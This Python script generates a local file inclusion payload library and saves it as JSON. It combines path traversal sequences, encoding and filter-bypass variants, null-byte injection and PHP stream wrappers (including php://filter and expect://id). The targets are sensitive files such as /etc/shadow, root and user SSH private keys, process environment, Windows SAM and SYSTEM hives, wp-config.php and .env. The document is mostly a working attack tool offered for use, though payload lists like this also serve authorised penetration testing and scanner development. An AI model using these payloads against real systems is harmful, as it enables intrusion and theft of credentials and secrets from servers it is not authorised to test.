#!/usr/bin/env python3
"""Generate massive LFI payload library"""
import json

payloads = []

# Unix LFI
unix_files = [
    '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname', 
    '/etc/resolv.conf', '/etc/issue', '/etc/motd', '/etc/group',
    '/proc/self/environ', '/proc/self/cmdline', '/proc/version',
    '/proc/cpuinfo', '/proc/meminfo', '/proc/net/dev',
    '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf',
    '/etc/nginx/nginx.conf', '/etc/my.cnf', '/etc/mysql/my.cnf',
    '/var/log/apache2/access.log', '/var/log/apache2/error.log',
    '/var/log/nginx/access.log', '/var/log/nginx/error.log',
    '/var/log/syslog', '/var/log/auth.log',
    '/home/*/.ssh/id_rsa', '/root/.ssh/id_rsa',
    '/etc/ssh/sshd_config', '/etc/crontab',
    '/etc/php.ini', '/usr/local/etc/php/php.ini',
    '/etc/php5/apache2/php.ini', '/etc/php7/apache2/php.ini',
]

# Traversal depths
depths = ['../', '../../', '../../../', '../../../../', '../../../../../',
          '../../../../../../', '../../../../../../../', '../../../../../../../../',
          '....//....//....//', '..;/..;/..;/', '..%2f..%2f..%2f',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2f', '%252e%252e%252f']

for depth in depths[:5]:
    for f in unix_files:
        path = depth + f.lstrip('/')
        payloads.append(['unix_lfi', path])

# Windows LFI
win_files = [
    'windows\\win.ini', 'windows\\system32\\drivers\\etc\\hosts',
    'windows\\system32\\config\\SAM', 'windows\\system32\\config\\SYSTEM',
    'windows\\system32\\config\\SECURITY', 'boot.ini',
    'autoexec.bat', 'windows\\repair\\SAM',
    'windows\\php.ini', 'windows\\system32\\inetsrv\\MetaBase.xml',
    'Program Files\\Apache Group\\Apache\\conf\\httpd.conf',
    'Program Files\\mysql\\my.ini', 'Program Files\\mysql\\data\\mysql\\user.MYD',
]

win_depths = ['..\\', '..\\..\\', '..\\..\\..\\', '..\\..\\..\\..\\', '..\\..\\..\\..\\..\\']
for depth in win_depths:
    for f in win_files:
        payloads.append(['win_lfi', depth + f])

# PHP Wrapper LFI
wrappers = [
    ('php_filter', 'php://filter/convert.base64-encode/resource='),
    ('php_filter_str', 'php://filter/read=convert.base64-encode/resource='),
    ('php_input', 'php://input'),
    ('data_uri', 'data://text/plain;base64,'),
    ('expect', 'expect://id'),
    ('phar', 'phar://test.phar'),
]

wrapper_files = ['config.php', 'index.php', 'admin.php', 'login.php', 'db.php', 'database.php', 'wp-config.php', '.env']
for wtype, wrapper in wrappers[:2]:
    for f in wrapper_files:
        payloads.append([wtype, wrapper + f])

# Double URL Encoding
for f in unix_files[:10]:
    encoded_hex = ''.join('%{:02x}'.format(ord(c)) for c in f)
    payloads.append(['double_enc', encoded_hex])
    double_enc = ''.join('%25{:02x}'.format(ord(c)) for c in f) 
    payloads.append(['double_enc', double_enc])

# Null Byte Injection
for depth in depths[:3]:
    for f in unix_files[:5]:
        payloads.append(['nullbyte', depth + f.lstrip('/') + '%00'])

print(f'Total LFI payloads generated: {len(payloads)}')
with open('payloads_lfi.json', 'w') as f:
    json.dump({'count': len(payloads), 'payloads': payloads}, f)
print('Saved to payloads_lfi.json')
